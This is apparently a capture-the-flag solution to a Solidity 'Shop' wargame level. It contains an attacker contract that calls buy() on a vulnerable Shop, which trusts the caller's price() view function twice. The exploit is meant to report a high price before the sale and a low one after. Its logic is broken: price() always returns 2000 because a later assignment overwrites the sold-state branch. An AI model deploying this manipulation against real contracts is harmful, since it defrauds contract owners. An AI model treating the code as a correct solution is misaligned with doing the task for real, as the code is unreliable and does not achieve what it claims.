// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Task.sol';

contract ShopSolution {

    Shop public victim;

    constructor(address _shop) {
        victim = Shop(_shop);

    }

    function getVictimStatus () internal view returns (bool) {
        return victim.isSold();
    }

    function price() external view returns (uint) {
        uint result;
        if (victim.isSold() == true) {
            result = 1;
        }
        result = 2000;
        return result;

    }

    function attackBuy() public {
        victim.buy();
    }

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}